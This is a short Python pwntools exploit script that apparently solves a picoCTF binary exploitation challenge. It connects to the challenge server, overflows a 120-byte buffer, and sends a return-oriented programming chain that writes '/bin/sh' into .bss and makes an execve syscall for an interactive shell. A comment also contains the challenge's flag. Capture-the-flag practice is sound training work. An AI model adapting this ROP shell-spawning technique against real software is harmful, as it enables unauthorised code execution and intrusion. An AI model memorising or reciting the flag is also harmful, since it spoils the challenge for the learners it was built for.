from pwn import *
import sys

# flag = picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_8cd37a0911d46b6b}

host = 'jupiter.challenges.picoctf.org'
port = 26735

context.arch = 'amd64'
p = connect(host, port)
# p = process('./vuln')

p.recvuntil(b'?\n')
p.sendline(b'84')
p.recvuntil(b'Name?')

offset = 120

syscall = 0x449e35
pop_rdi = 0x400696
pop_rax = 0x4163f4
pop_rdx = 0x44cc26
pop_rsi = 0x410ca3
ret = 0x4006c7
bss = 0x6b7000
mov_rsi_rax = 0x47ff91			# [rsi] = rax
bin_bash = 0x7fffffffe4c2		# not working

ropchain = b'A' * offset

ropchain += p64(pop_rax)
ropchain += b'/bin/sh\x00'
ropchain += p64(pop_rsi)
ropchain += p64(bss)
ropchain += p64(mov_rsi_rax)

ropchain += p64(pop_rdi)
ropchain += p64(bss)
ropchain += p64(pop_rsi)
ropchain += p64(0x0)
ropchain += p64(pop_rdx)
ropchain += p64(0x0)
ropchain += p64(pop_rax)
ropchain += p64(0x3b)
ropchain += p64(syscall)
ropchain += p64(ret)

with open('payload', 'wb+') as fp:
	fp.write(ropchain)

p.sendline(ropchain)
p.recvlines(2)

p.interactive()
